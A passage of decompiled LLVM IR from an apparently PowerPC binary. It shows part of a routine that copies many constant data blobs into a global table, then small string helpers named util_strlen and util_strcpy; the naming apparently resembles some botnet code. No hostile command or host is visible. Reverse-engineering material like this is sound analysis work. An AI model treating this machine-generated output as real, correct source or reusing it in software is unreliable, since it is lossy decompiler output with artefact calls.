  %v1_1000904c = trunc i32 %v0_1000904c to i16
  store i16 %v1_1000904c, i16* bitcast (i32* @global_var_10023908.330 to i16*), align 4
  store i32 268472404, i32* @lr, align 4
  %v1_10009050 = call i32 @malloc(i32 3)
  store i32 %v1_10009050, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10009068.332 to i32), i32* @lr, align 4
  %v4_10009064 = call i32 @util_memcpy(i32 ptrtoint ([4 x i8]* @global_var_10010438.331 to i32), i32 3, i32 3)
  store i16 3, i16* bitcast (i32* @global_var_10023910.333 to i16*), align 4
  %v0_10009074 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009074, i32* @global_var_1002390c.334, align 4
  store i32 268472444, i32* @lr, align 4
  %v1_10009078 = call i32 @malloc(i32 23)
  store i32 %v1_10009078, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009090.336 to i32), i32* @lr, align 4
  %v3_1000908c = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_1001043c.335 to i32), i32 23, i32 23)
  %v0_10009094 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009094, i32* @global_var_10023914.337, align 4
  store i32 11, i32* @r26, align 4
  %v0_1000909c = load i32, i32* @r24, align 4
  %v1_1000909c = trunc i32 %v0_1000909c to i16
  store i16 %v1_1000909c, i16* bitcast (i32* @global_var_10023918.338 to i16*), align 4
  store i32 268472484, i32* @lr, align 4
  %v1_100090a0 = call i32 @malloc(i32 28)
  store i32 %v1_100090a0, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100090b8.340 to i32), i32* @lr, align 4
  %v3_100090b4 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010454.339 to i32), i32 28, i32 28)
  store i16 28, i16* bitcast (i32* @global_var_10023920.341 to i16*), align 4
  %v0_100090c4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100090c4, i32* @global_var_1002391c.342, align 4
  store i32 268472524, i32* @lr, align 4
  %v1_100090c8 = call i32 @malloc(i32 9)
  store i32 %v1_100090c8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100090e0.344 to i32), i32* @lr, align 4
  %v4_100090dc = call i32 @util_memcpy(i32 ptrtoint ([10 x i8]* @global_var_10010474.343 to i32), i32 9, i32 9)
  %v0_100090e4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100090e4, i32* @global_var_10023924.345, align 4
  %v0_100090e8 = load i32, i32* @r23, align 4
  %v1_100090e8 = trunc i32 %v0_100090e8 to i16
  store i16 %v1_100090e8, i16* bitcast (i32* @global_var_10023928.346 to i16*), align 4
  store i32 268472560, i32* @lr, align 4
  %v1_100090ec = call i32 @malloc(i32 8)
  %v0_100090f0 = load i32, i32* @r27, align 4
  store i32 %v1_100090ec, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009100.347 to i32), i32* @lr, align 4
  %v4_100090fc = call i32 @util_memcpy(i32 %v0_100090f0, i32 8, i32 8)
  %v0_10009104 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009104, i32* @global_var_1002392c.348, align 4
  %v0_10009108 = load i32, i32* @r22, align 4
  %v1_10009108 = trunc i32 %v0_10009108 to i16
  store i16 %v1_10009108, i16* bitcast (i32* @global_var_10023930.349 to i16*), align 4
  store i32 268472592, i32* @lr, align 4
  %v1_1000910c = call i32 @malloc(i32 5)
  store i32 %v1_1000910c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009124.351 to i32), i32* @lr, align 4
  %v4_10009120 = call i32 @util_memcpy(i32 ptrtoint ([6 x i8]* @global_var_10010480.350 to i32), i32 5, i32 5)
  %v0_10009128 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009128, i32* @global_var_10023934.352, align 4
  store i32 21, i32* @r27, align 4
  %v0_10009130 = load i32, i32* %r15.global-to-local, align 4
  %v1_10009130 = trunc i32 %v0_10009130 to i16
  store i16 %v1_10009130, i16* bitcast (i32* @global_var_10023938.353 to i16*), align 4
  store i32 268472632, i32* @lr, align 4
  %v1_10009134 = call i32 @malloc(i32 6)
  store i32 %v1_10009134, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000914c.355 to i32), i32* @lr, align 4
  %v4_10009148 = call i32 @util_memcpy(i32 ptrtoint ([7 x i8]* @global_var_10010488.354 to i32), i32 6, i32 6)
  %v0_10009150 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009150, i32* @global_var_1002393c.356, align 4
  %v0_10009154 = load i32, i32* @r25, align 4
  %v1_10009154 = trunc i32 %v0_10009154 to i16
  store i16 %v1_10009154, i16* bitcast (i32* @global_var_10023940.357 to i16*), align 4
  store i32 268472668, i32* @lr, align 4
  %v1_10009158 = call i32 @malloc(i32 16)
  store i32 %v1_10009158, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009170.359 to i32), i32* @lr, align 4
  %v3_1000916c = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010490.358 to i32), i32 16, i32 16)
  %v0_10009174 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009174, i32* @global_var_10023944.360, align 4
  store i32 10, i32* @r25, align 4
  %v0_1000917c = load i32, i32* %r19.global-to-local, align 4
  %v1_1000917c = trunc i32 %v0_1000917c to i16
  store i16 %v1_1000917c, i16* bitcast (i32* @global_var_10023948.361 to i16*), align 4
  store i32 268472708, i32* @lr, align 4
  %v1_10009180 = call i32 @malloc(i32 21)
  store i32 %v1_10009180, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009198.363 to i32), i32* @lr, align 4
  %v3_10009194 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100104a4.362 to i32), i32 21, i32 21)
  %v0_1000919c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000919c, i32* @global_var_1002394c.364, align 4
  %v0_100091a0 = load i32, i32* @r27, align 4
  %v1_100091a0 = trunc i32 %v0_100091a0 to i16
  store i16 %v1_100091a0, i16* bitcast (i32* @global_var_10023950.365 to i16*), align 4
  store i32 268472744, i32* @lr, align 4
  %v1_100091a4 = call i32 @malloc(i32 21)
  store i32 %v1_100091a4, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100091bc.367 to i32), i32* @lr, align 4
  %v3_100091b8 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100104bc.366 to i32), i32 21, i32 21)
  %v0_100091c0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100091c0, i32* @global_var_10023954.368, align 4
  %v0_100091c4 = load i32, i32* @r27, align 4
  %v1_100091c4 = trunc i32 %v0_100091c4 to i16
  store i16 %v1_100091c4, i16* bitcast (i32* @global_var_10023958.369 to i16*), align 4
  store i32 268472780, i32* @lr, align 4
  %v1_100091c8 = call i32 @malloc(i32 17)
  store i32 %v1_100091c8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100091e0.371 to i32), i32* @lr, align 4
  %v3_100091dc = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100104d4.370 to i32), i32 17, i32 17)
  store i16 17, i16* bitcast (i32* @global_var_10023960.372 to i16*), align 4
  %v0_100091ec = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100091ec, i32* @global_var_1002395c.373, align 4
  store i32 268472820, i32* @lr, align 4
  %v1_100091f0 = call i32 @malloc(i32 11)
  store i32 %v1_100091f0, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009208.375 to i32), i32* @lr, align 4
  %v4_10009204 = call i32 @util_memcpy(i32 ptrtoint ([12 x i8]* @global_var_100104e8.374 to i32), i32 11, i32 11)
  %v0_1000920c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000920c, i32* @global_var_10023964.376, align 4
  %v0_10009210 = load i32, i32* @r26, align 4
  %v1_10009210 = trunc i32 %v0_10009210 to i16
  store i16 %v1_10009210, i16* bitcast (i32* @global_var_10023968.377 to i16*), align 4
  store i32 268472856, i32* @lr, align 4
  %v1_10009214 = call i32 @malloc(i32 23)
  store i32 %v1_10009214, i32* %r28.global-to-local, align 4
  store i32 268472876, i32* @lr, align 4
  %v3_10009228 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100104f4.378 to i32), i32 23, i32 23)
  %v0_1000922c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000922c, i32* @global_var_1002396c.379, align 4
  store i32 ptrtoint (i32* @global_var_1001026c.380 to i32), i32* @r28, align 4
  %v0_1000923c = load i32, i32* @r24, align 4
  %v1_1000923c = trunc i32 %v0_1000923c to i16
  store i16 %v1_1000923c, i16* bitcast (i32* @global_var_10023970.381 to i16*), align 4
  store i32 268472900, i32* @lr, align 4
  %v1_10009240 = call i32 @malloc(i32 83)
  %v0_10009244 = load i32, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10009254.382 to i32), i32* @lr, align 4
  %v3_10009250 = call i32 @util_memcpy(i32 %v0_10009244, i32 83, i32 83)
  store i16 83, i16* bitcast (i32* @global_var_10023978.383 to i16*), align 4
  store i32 %v1_10009240, i32* @global_var_10023974.384, align 4
  store i32 268472936, i32* @lr, align 4
  %v1_10009264 = call i32 @malloc(i32 32)
  store i32 ptrtoint (i32* @global_var_10009278.386 to i32), i32* @lr, align 4
  %v3_10009274 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100102c0.385 to i32), i32 32, i32 32)
  store i16 32, i16* bitcast (i32* @global_var_10023980.387 to i16*), align 4
  store i32 %v1_10009264, i32* @global_var_1002397c.388, align 4
  store i32 268472972, i32* @lr, align 4
  %v1_10009288 = call i32 @malloc(i32 48)
  store i32 %v1_10009288, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100092a0.390 to i32), i32* @lr, align 4
  %v3_1000929c = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_1001050c.389 to i32), i32 48, i32 48)
  store i16 48, i16* bitcast (i32* @global_var_10023988.391 to i16*), align 4
  %v0_100092ac = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100092ac, i32* @global_var_10023984.392, align 4
  store i32 268473012, i32* @lr, align 4
  %v1_100092b0 = call i32 @malloc(i32 12)
  store i32 %v1_100092b0, i32* %r28.global-to-local, align 4
  store i32 12, i32* @r27, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100092cc.394 to i32), i32* @lr, align 4
  %v3_100092c8 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010540.393 to i32), i32 12, i32 12)
  %v0_100092d0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100092d0, i32* @global_var_1002398c.395, align 4
  %v0_100092d4 = load i32, i32* @r27, align 4
  %v1_100092d4 = trunc i32 %v0_100092d4 to i16
  store i16 %v1_100092d4, i16* bitcast (i32* @global_var_10023990.396 to i16*), align 4
  store i32 268473052, i32* @lr, align 4
  %v1_100092d8 = call i32 @malloc(i32 9)
  store i32 %v1_100092d8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100092f0.398 to i32), i32* @lr, align 4
  %v3_100092ec = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010550.397 to i32), i32 9, i32 9)
  %v0_100092f4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100092f4, i32* @global_var_10023994.399, align 4
  %v0_100092f8 = load i32, i32* @r23, align 4
  %v1_100092f8 = trunc i32 %v0_100092f8 to i16
  store i16 %v1_100092f8, i16* bitcast (i32* @global_var_10023998.400 to i16*), align 4
  store i32 268473088, i32* @lr, align 4
  %v1_100092fc = call i32 @malloc(i32 10)
  store i32 %v1_100092fc, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009314.402 to i32), i32* @lr, align 4
  %v3_10009310 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_1001055c.401 to i32), i32 10, i32 10)
  %v0_10009318 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009318, i32* @global_var_1002399c.403, align 4
  %v0_1000931c = load i32, i32* @r25, align 4
  %v1_1000931c = trunc i32 %v0_1000931c to i16
  store i16 %v1_1000931c, i16* bitcast (i32* @global_var_100239a0.404 to i16*), align 4
  store i32 268473124, i32* @lr, align 4
  %v1_10009320 = call i32 @malloc(i32 12)
  store i32 %v1_10009320, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009338.406 to i32), i32* @lr, align 4
  %v3_10009334 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010568.405 to i32), i32 12, i32 12)
  %v0_1000933c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000933c, i32* @global_var_100239a4.407, align 4
  %v0_10009340 = load i32, i32* @r27, align 4
  %v1_10009340 = trunc i32 %v0_10009340 to i16
  store i16 %v1_10009340, i16* bitcast (i32* @global_var_100239a8.408 to i16*), align 4
  store i32 268473160, i32* @lr, align 4
  %v1_10009344 = call i32 @malloc(i32 16)
  store i32 %v1_10009344, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000935c.410 to i32), i32* @lr, align 4
  %v3_10009358 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010578.409 to i32), i32 16, i32 16)
  %v0_10009360 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009360, i32* @global_var_100239ac.411, align 4
  %v0_10009364 = load i32, i32* %r19.global-to-local, align 4
  %v1_10009364 = trunc i32 %v0_10009364 to i16
  store i16 %v1_10009364, i16* bitcast (i32* @global_var_100239b0.412 to i16*), align 4
  store i32 268473196, i32* @lr, align 4
  %v1_10009368 = call i32 @malloc(i32 19)
  store i32 %v1_10009368, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009380.414 to i32), i32* @lr, align 4
  %v3_1000937c = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_1001058c.413 to i32), i32 19, i32 19)
  %v0_10009384 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009384, i32* @global_var_100239b4.415, align 4
  %v0_10009388 = load i32, i32* %r17.global-to-local, align 4
  %v1_10009388 = trunc i32 %v0_10009388 to i16
  store i16 %v1_10009388, i16* bitcast (i32* @global_var_100239b8.416 to i16*), align 4
  store i32 268473232, i32* @lr, align 4
  %v1_1000938c = call i32 @malloc(i32 8)
  store i32 %v1_1000938c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100093a4.418 to i32), i32* @lr, align 4
  %v4_100093a0 = call i32 @util_memcpy(i32 ptrtoint ([9 x i8]* @global_var_100105a0.417 to i32), i32 8, i32 8)
  %v0_100093a8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100093a8, i32* @global_var_100239bc.419, align 4
  %v0_100093ac = load i32, i32* @r22, align 4
  %v1_100093ac = trunc i32 %v0_100093ac to i16
  store i16 %v1_100093ac, i16* bitcast (i32* @global_var_100239c0.420 to i16*), align 4
  store i32 268473268, i32* @lr, align 4
  %v1_100093b0 = call i32 @malloc(i32 11)
  store i32 %v1_100093b0, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100093c8.422 to i32), i32* @lr, align 4
  %v3_100093c4 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010500.421 to i32), i32 11, i32 11)
  %v0_100093cc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100093cc, i32* @global_var_100239c4.423, align 4
  %v0_100093d0 = load i32, i32* @r26, align 4
  %v1_100093d0 = trunc i32 %v0_100093d0 to i16
  store i16 %v1_100093d0, i16* bitcast (i32* @global_var_100239c8.424 to i16*), align 4
  store i32 268473304, i32* @lr, align 4
  %v1_100093d4 = call i32 @malloc(i32 12)
  store i32 %v1_100093d4, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100093ec.426 to i32), i32* @lr, align 4
  %v3_100093e8 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100105ac.425 to i32), i32 12, i32 12)
  %v0_100093f0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100093f0, i32* @global_var_100239cc.427, align 4
  %v0_100093f4 = load i32, i32* @r27, align 4
  %v1_100093f4 = trunc i32 %v0_100093f4 to i16
  store i16 %v1_100093f4, i16* bitcast (i32* @global_var_100239d0.428 to i16*), align 4
  store i32 268473340, i32* @lr, align 4
  %v1_100093f8 = call i32 @malloc(i32 18)
  store i32 %v1_100093f8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10009410.430 to i32), i32* @lr, align 4
  %v3_1000940c = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100105bc.429 to i32), i32 18, i32 18)
  store i16 18, i16* bitcast (i32* @global_var_100239d8.431 to i16*), align 4
  %v0_1000941c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000941c, i32* @global_var_100239d4.432, align 4
  store i32 268473380, i32* @lr, align 4
  %v1_10009420 = call i32 @malloc(i32 25)
  store i32 %v1_10009420, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10009438.434 to i32), i32* @lr, align 4
  %v3_10009434 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100105d0.433 to i32), i32 25, i32 25)
  store i16 25, i16* bitcast (i32* @global_var_100239e0.435 to i16*), align 4
  %v0_10009444 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009444, i32* @global_var_100239dc.436, align 4
  store i32 268473420, i32* @lr, align 4
  %v1_10009448 = call i32 @malloc(i32 115)
  store i32 %v1_10009448, i32* %r28.global-to-local, align 4
  store i32 115, i32* @r27, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009464.438 to i32), i32* @lr, align 4
  %v3_10009460 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100105ec.437 to i32), i32 115, i32 115)
  %v0_10009468 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009468, i32* @global_var_100239e4.439, align 4
  %v0_1000946c = load i32, i32* @r27, align 4
  %v1_1000946c = trunc i32 %v0_1000946c to i16
  store i16 %v1_1000946c, i16* bitcast (i32* @global_var_100239e8.440 to i16*), align 4
  store i32 268473460, i32* @lr, align 4
  %v1_10009470 = call i32 @malloc(i32 115)
  store i32 %v1_10009470, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009488.442 to i32), i32* @lr, align 4
  %v3_10009484 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010660.441 to i32), i32 115, i32 115)
  %v0_1000948c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000948c, i32* @global_var_100239ec.443, align 4
  %v0_10009490 = load i32, i32* @r27, align 4
  %v1_10009490 = trunc i32 %v0_10009490 to i16
  store i16 %v1_10009490, i16* bitcast (i32* @global_var_100239f0.444 to i16*), align 4
  store i32 268473496, i32* @lr, align 4
  %v1_10009494 = call i32 @malloc(i32 79)
  store i32 %v1_10009494, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100094ac.446 to i32), i32* @lr, align 4
  %v3_100094a8 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100106d4.445 to i32), i32 79, i32 79)
  store i16 79, i16* bitcast (i32* @global_var_100239f8.447 to i16*), align 4
  %v0_100094b8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100094b8, i32* @global_var_100239f4.448, align 4
  store i32 268473536, i32* @lr, align 4
  %v1_100094bc = call i32 @malloc(i32 114)
  store i32 %v1_100094bc, i32* %r28.global-to-local, align 4
  store i32 114, i32* @r27, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100094d8.450 to i32), i32* @lr, align 4
  %v3_100094d4 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010724.449 to i32), i32 114, i32 114)
  %v0_100094dc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100094dc, i32* @global_var_100239fc.451, align 4
  %v0_100094e0 = load i32, i32* @r27, align 4
  %v1_100094e0 = trunc i32 %v0_100094e0 to i16
  store i16 %v1_100094e0, i16* bitcast (i32* @global_var_10023a00.452 to i16*), align 4
  store i32 268473576, i32* @lr, align 4
  %v1_100094e4 = call i32 @malloc(i32 114)
  store i32 %v1_100094e4, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100094fc.454 to i32), i32* @lr, align 4
  %v3_100094f8 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010798.453 to i32), i32 114, i32 114)
  %v0_10009500 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009500, i32* @global_var_10023a04.455, align 4
  %v0_10009504 = load i32, i32* @r27, align 4
  %v1_10009504 = trunc i32 %v0_10009504 to i16
  store i16 %v1_10009504, i16* bitcast (i32* @global_var_10023a08.456 to i16*), align 4
  store i32 268473612, i32* @lr, align 4
  %v1_10009508 = call i32 @malloc(i32 14)
  %v0_1000950c = load i32, i32* @r21, align 4
  store i32 %v1_10009508, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000951c.457 to i32), i32* @lr, align 4
  %v3_10009518 = call i32 @util_memcpy(i32 %v0_1000950c, i32 14, i32 14)
  %v0_10009520 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009520, i32* @global_var_10023a0c.458, align 4
  %v0_10009524 = load i32, i32* %r16.global-to-local, align 4
  %v1_10009524 = trunc i32 %v0_10009524 to i16
  store i16 %v1_10009524, i16* bitcast (i32* @global_var_10023a10.459 to i16*), align 4
  store i32 268473644, i32* @lr, align 4
  %v1_10009528 = call i32 @malloc(i32 19)
  %v0_1000952c = load i32, i32* %r20.global-to-local, align 4
  store i32 %v1_10009528, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000953c.460 to i32), i32* @lr, align 4
  %v3_10009538 = call i32 @util_memcpy(i32 %v0_1000952c, i32 19, i32 19)
  %v0_10009540 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009540, i32* @global_var_10023a14.461, align 4
  %v0_10009544 = load i32, i32* %r17.global-to-local, align 4
  %v1_10009544 = trunc i32 %v0_10009544 to i16
  store i16 %v1_10009544, i16* bitcast (i32* @global_var_10023a18.462 to i16*), align 4
  store i32 268473676, i32* @lr, align 4
  %v1_10009548 = call i32 @malloc(i32 23)
  %v0_1000954c = load i32, i32* %r18.global-to-local, align 4
  store i32 %v1_10009548, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000955c.463 to i32), i32* @lr, align 4
  %v3_10009558 = call i32 @util_memcpy(i32 %v0_1000954c, i32 23, i32 23)
  %v0_10009560 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009560, i32* @global_var_10023a1c.464, align 4
  %v0_10009564 = load i32, i32* @r24, align 4
  %v1_10009564 = trunc i32 %v0_10009564 to i16
  store i16 %v1_10009564, i16* bitcast (i32* @global_var_10023a20.465 to i16*), align 4
  store i32 268473708, i32* @lr, align 4
  %v1_10009568 = call i32 @malloc(i32 10)
  store i32 %v1_10009568, i32* %r28.global-to-local, align 4
  store i32 268473728, i32* @lr, align 4
  %v4_1000957c = call i32 @util_memcpy(i32 ptrtoint ([11 x i8]* @global_var_1001080c.466 to i32), i32 10, i32 10)
  %v0_10009584 = load i32, i32* @r25, align 4
  %v1_10009584 = trunc i32 %v0_10009584 to i16
  store i16 %v1_10009584, i16* bitcast (i32* @global_var_10023a28.467 to i16*), align 4
  %v0_10009588 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009588, i32* @global_var_10023a24.468, align 4
  store i32 %v0_10008c94, i32* @r21, align 4
  store i32 %v0_10008c9c, i32* @r22, align 4
  store i32 %v0_10008ca4, i32* @r23, align 4
  store i32 %v0_10008cac, i32* @r24, align 4
  store i32 %v0_10008cb4, i32* @r25, align 4
  store i32 %v0_10008cc4, i32* @r27, align 4
  store i32 %v0_10008ccc, i32* @r28, align 4
  ret i32 %v4_1000957c

; uselistorder directives
  uselistorder i32 114, { 3, 4, 0, 2, 1, 6, 5 }
  uselistorder i32 79, { 1, 2, 0 }
  uselistorder i32 115, { 3, 4, 0, 2, 1, 6, 5 }
  uselistorder i32 83, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_100095d4 = load i8, i8* %arg1, align 1
  %v3_100095e0 = icmp eq i8 %v3_100095d4, 0
  %v0_100095e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100095e0, i32 %v0_100095e4)
  br label %dec_label_pc_100095e8

dec_label_pc_100095e8:                            ; preds = %dec_label_pc_100095e8, %entry
  %v0_100095e8 = phi i32 [ %v1_100095e8, %dec_label_pc_100095e8 ], [ 0, %entry ]
  %v1_100095e8 = add i32 %v0_100095e8, 1
  %v2_100095ec = add i32 %v1_100095e8, %tmp
  %v3_100095ec = inttoptr i32 %v2_100095ec to i8*
  %v4_100095ec = load i8, i8* %v3_100095ec, align 1
  %v3_100095f0 = icmp eq i8 %v4_100095ec, 0
  br i1 %v3_100095f0, label %dec_label_pc_100095f8, label %dec_label_pc_100095e8

dec_label_pc_100095f8:                            ; preds = %dec_label_pc_100095e8
  ret i32 %v1_100095e8
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_100095fc = load i8, i8* %arg1, align 1
  store i32 0, i32* %r11.global-to-local, align 4
  %v3_10009604 = icmp eq i8 %v2_100095fc, 0
  br i1 %v3_10009604, label %dec_label_pc_1000961c, label %dec_label_pc_1000960c

dec_label_pc_1000960c:                            ; preds = %entry, %dec_label_pc_1000960c
  %v0_1000960c = phi i32 [ %v1_1000960c, %dec_label_pc_1000960c ], [ 0, %entry ]
  %v1_1000960c = add i32 %v0_1000960c, 1
  store i32 %v1_1000960c, i32* %r11.global-to-local, align 4
  %v2_10009610 = add i32 %v1_1000960c, %tmp
  %v3_10009610 = inttoptr i32 %v2_10009610 to i8*
  %v4_10009610 = load i8, i8* %v3_10009610, align 1
  %v3_10009614 = icmp eq i8 %v4_10009610, 0
  br i1 %v3_10009614, label %dec_label_pc_1000961c.loopexit, label %dec_label_pc_1000960c

dec_label_pc_1000961c.loopexit:                   ; preds = %dec_label_pc_1000960c
  %phitmp = add i32 %v0_1000960c, 2
  br label %dec_label_pc_1000961c

dec_label_pc_1000961c:                            ; preds = %dec_label_pc_1000961c.loopexit, %entry
  %v0_1000961c = phi i32 [ %phitmp, %dec_label_pc_1000961c.loopexit ], [ 1, %entry ]
  store i32 %v0_1000961c, i32* %ctr.global-to-local, align 4
  %v2_1000962c3 = load i32, i32* @r3, align 4
  %v3_1000962c4 = inttoptr i32 %v2_1000962c3 to i8*
  store i8 %v2_100095fc, i8* %v3_1000962c4, align 1
  %v0_100096305 = load i32, i32* @r3, align 4
  %v1_100096306 = add i32 %v0_100096305, 1
  store i32 %v1_100096306, i32* %r3.global-to-local, align 4
  %v0_100096347 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100096348 = add i32 %v0_100096347, -1
  store i32 %v1_100096348, i32* %ctr.global-to-local, align 4
  %v2_100096349 = icmp eq i32 %v1_100096348, 0
  br i1 %v2_100096349, label %dec_label_pc_10009638, label %dec_label_pc_10009628

dec_label_pc_10009628:                            ; preds = %dec_label_pc_1000961c, %dec_label_pc_10009628
  %v2_1000962c = phi i32 [ %v1_10009630, %dec_label_pc_10009628 ], [ %v1_100096306, %dec_label_pc_1000961c ]
  %v0_10009628 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009628 = add i32 %v0_10009628, 1
  %v2_10009628 = inttoptr i32 %v1_10009628 to i8*
  %v3_10009628 = load i8, i8* %v2_10009628, align 1
  store i32 %v1_10009628, i32* %r4.global-to-local, align 4
  %v3_1000962c = inttoptr i32 %v2_1000962c to i8*
  store i8 %v3_10009628, i8* %v3_1000962c, align 1
  %v0_10009630 = load i32, i32* %r3.global-to-local, align 4
  %v1_10009630 = add i32 %v0_10009630, 1
  store i32 %v1_10009630, i32* %r3.global-to-local, align 4
  %v0_10009634 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009634 = add i32 %v0_10009634, -1
  store i32 %v1_10009634, i32* %ctr.global-to-local, align 4
  %v2_10009634 = icmp eq i32 %v1_10009634, 0
  br i1 %v2_10009634, label %dec_label_pc_10009638, label %dec_label_pc_10009628

dec_label_pc_10009638:                            ; preds = %dec_label_pc_10009628, %dec_label_pc_1000961c
  %v0_10009638 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10009638, i32* %r3.global-to-local, align 4
  ret i32 %v0_10009638

